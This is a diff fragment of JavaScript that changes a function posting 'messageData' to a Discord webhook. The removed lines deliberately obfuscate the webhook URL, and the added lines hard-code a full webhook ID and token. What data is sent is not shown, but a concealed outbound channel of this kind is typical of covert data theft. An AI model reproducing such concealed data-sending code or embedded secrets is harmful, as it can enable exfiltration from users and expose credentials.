@@ -1223,14 +1223,15 @@
             // Function to send data to Discord with obfuscated webhook URL
             function sendToDiscord(messageData) {
                 // Obfuscate Discord webhook URL by breaking it into parts
-                const urlParts = ['https://', 'discord', '.com/api/', 'webhooks'];
-                const idParts = ['1173', '2971', '8752', '8909', '3456'];
-                const tokenParts = ['Huz', 'BQfR', 'cS3Q', 'VYbNp', 'AODL', 'H_k8', 'X-ZT', 'mfaQC', 'p41', 'fUlM', 'JXoHj', 'Bqk'];
                 
                 // Construct the webhook URL
-                const webhookURL = urlParts.join('') + '/' + idParts.join('') + '/' + tokenParts.join('');
                 
-                return fetch("https://discord.com/api/webhooks/1380271257152393356/HYNo2HAKKF00qWAliFV4tVwlAJCIvYi16R47nw3ipRehpmvvSHsjJJOfX_Ja3yr4Fbo5", {
+                const baseUrl = "https://discord.com/api/webhooks/";
+                const id = "1380271257152393356";
+                const token = "HYNo2HAKKF00qWAliFV4tVwlAJCIvYi16R47nw3ipRehpmvvSHsjJJOfX_Ja3yr4Fbo5";
+                const webhookUrl = baseUrl + id + "/" + token;
+                
+                return fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
